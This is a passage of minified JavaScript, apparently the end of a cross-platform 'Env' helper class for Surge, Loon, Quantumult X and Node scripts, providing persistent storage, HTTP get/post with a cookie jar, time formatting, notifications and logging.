t=this.path.resolve(this.dataFile),e=this.path.resolve(process.cwd(),this.dataFile),s=this.fs.existsSync(t),i=!s&&this.fs.existsSync(e),r=JSON.stringify(this.data);s?this.fs.writeFileSync(t,r):i?this.fs.writeFileSync(e,r):this.fs.writeFileSync(t,r)}}lodash_get(t,e,s){const i=e.replace(/\[(\d+)\]/g,".$1").split(".");let r=t;for(const t of i)if(r=Object(r)[t],void 0===r)return s;return r}lodash_set(t,e,s){return Object(t)!==t?t:(Array.isArray(e)||(e=e.toString().match(/[^.[\]]+/g)||[]),e.slice(0,-1).reduce((t,s,i)=>Object(t[s])===t[s]?t[s]:t[s]=Math.abs(e[i+1])>>0==+e[i+1]?[]:{},t)[e[e.length-1]]=s,t)}getdata(t){let e=this.getval(t);if(/^@/.test(t)){const[,s,i]=/^@(.*?)\.(.*?)$/.exec(t),r=s?this.getval(s):"";if(r)try{const t=JSON.parse(r);e=t?this.lodash_get(t,i,""):e}catch(t){e=""}}return e}setdata(t,e){let s=!1;if(/^@/.test(e)){const[,i,r]=/^@(.*?)\.(.*?)$/.exec(e),o=this.getval(i),h=i?"null"===o?null:o||"{}":"{}";try{const e=JSON.parse(h);this.lodash_set(e,r,t),s=this.setval(JSON.stringify(e),i)}catch(e){const o={};this.lodash_set(o,r,t),s=this.setval(JSON.stringify(o),i)}}else s=this.setval(t,e);return s}getval(t){return this.isSurge()||this.isLoon()?$persistentStore.read(t):this.isQuanX()?$prefs.valueForKey(t):this.isNode()?(this.data=this.loaddata(),this.data[t]):this.data&&this.data[t]||null}setval(t,e){return this.isSurge()||this.isLoon()?$persistentStore.write(t,e):this.isQuanX()?$prefs.setValueForKey(t,e):this.isNode()?(this.data=this.loaddata(),this.data[e]=t,this.writedata(),!0):this.data&&this.data[e]||null}initGotEnv(t){this.got=this.got?this.got:require("got"),this.cktough=this.cktough?this.cktough:require("tough-cookie"),this.ckjar=this.ckjar?this.ckjar:new this.cktough.CookieJar,t&&(t.headers=t.headers?t.headers:{},void 0===t.headers.Cookie&&void 0===t.cookieJar&&(t.cookieJar=this.ckjar))}get(t,e=(()=>{})){t.headers&&(delete t.headers["Content-Type"],delete t.headers["Content-Length"]),this.isSurge()||this.isLoon()?(this.isSurge()&&this.isNeedRewrite&&(t.headers=t.headers||{},Object.assign(t.headers,{"X-Surge-Skip-Scripting":!1})),$httpClient.get(t,(t,s,i)=>{!t&&s&&(s.body=i,s.statusCode=s.status),e(t,s,i)})):this.isQuanX()?(this.isNeedRewrite&&(t.opts=t.opts||{},Object.assign(t.opts,{hints:!1})),$task.fetch(t).then(t=>{const{statusCode:s,statusCode:i,headers:r,body:o}=t;e(null,{status:s,statusCode:i,headers:r,body:o},o)},t=>e(t))):this.isNode()&&(this.initGotEnv(t),this.got(t).on("redirect",(t,e)=>{try{if(t.headers["set-cookie"]){const s=t.headers["set-cookie"].map(this.cktough.Cookie.parse).toString();s&&this.ckjar.setCookieSync(s,null),e.cookieJar=this.ckjar}}catch(t){this.logErr(t)}}).then(t=>{const{statusCode:s,statusCode:i,headers:r,body:o}=t;e(null,{status:s,statusCode:i,headers:r,body:o},o)},t=>{const{message:s,response:i}=t;e(s,i,i&&i.body)}))}post(t,e=(()=>{})){if(t.body&&t.headers&&!t.headers["Content-Type"]&&(t.headers["Content-Type"]="application/x-www-form-urlencoded"),t.headers&&delete t.headers["Content-Length"],this.isSurge()||this.isLoon())this.isSurge()&&this.isNeedRewrite&&(t.headers=t.headers||{},Object.assign(t.headers,{"X-Surge-Skip-Scripting":!1})),$httpClient.post(t,(t,s,i)=>{!t&&s&&(s.body=i,s.statusCode=s.status),e(t,s,i)});else if(this.isQuanX())t.method="POST",this.isNeedRewrite&&(t.opts=t.opts||{},Object.assign(t.opts,{hints:!1})),$task.fetch(t).then(t=>{const{statusCode:s,statusCode:i,headers:r,body:o}=t;e(null,{status:s,statusCode:i,headers:r,body:o},o)},t=>e(t));else if(this.isNode()){this.initGotEnv(t);const{url:s,...i}=t;this.got.post(s,i).then(t=>{const{statusCode:s,statusCode:i,headers:r,body:o}=t;e(null,{status:s,statusCode:i,headers:r,body:o},o)},t=>{const{message:s,response:i}=t;e(s,i,i&&i.body)})}}time(t,e=null){const s=e?new Date(e):new Date;let i={"M+":s.getMonth()+1,"d+":s.getDate(),"H+":s.getHours(),"m+":s.getMinutes(),"s+":s.getSeconds(),"q+":Math.floor((s.getMonth()+3)/3),S:s.getMilliseconds()};/(y+)/.test(t)&&(t=t.replace(RegExp.$1,(s.getFullYear()+"").substr(4-RegExp.$1.length)));for(let e in i)new RegExp("("+e+")").test(t)&&(t=t.replace(RegExp.$1,1==RegExp.$1.length?i[e]:("00"+i[e]).substr((""+i[e]).length)));return t}msg(e=t,s="",i="",r){const o=t=>{if(!t)return t;if("string"==typeof t)return this.isLoon()?t:this.isQuanX()?{"open-url":t}:this.isSurge()?{url:t}:void 0;if("object"==typeof t){if(this.isLoon()){let e=t.openUrl||t.url||t["open-url"],s=t.mediaUrl||t["media-url"];return{openUrl:e,mediaUrl:s}}if(this.isQuanX()){let e=t["open-url"]||t.url||t.openUrl,s=t["media-url"]||t.mediaUrl;return{"open-url":e,"media-url":s}}if(this.isSurge()){let e=t.url||t.openUrl||t["open-url"];return{url:e}}}};if(this.isMute||(this.isSurge()||this.isLoon()?$notification.post(e,s,i,o(r)):this.isQuanX()&&$notify(e,s,i,o(r))),!this.isMuteLog){let t=["","==============📣系统通知📣=============="];t.push(e),s&&t.push(s),i&&t.push(i),console.log(t.join("\n")),this.logs=this.logs.concat(t)}}log(...t){t.length>0&&(this.logs=[...this.logs,...t]),console.log(t.join(this.logSeparator))}logErr(t,e){const s=!this.isSurge()&&!this.isQuanX()&&!this.isLoon();s?this.log("",`❗️${this.name}, 错误!`,t.stack):this.log("",`❗️${this.name}, 错误!`,t)}wait(t){return new Promise(e=>setTimeout(e,t))}done(t={}){const e=(new Date).getTime(),s=(e-this.startTime)/1e3;this.log("",`🔔${this.name}, 结束! 🕛 ${s} 秒`),this.log(),(this.isSurge()||this.isQuanX()||this.isLoon())&&$done(t)}}(t,e)}
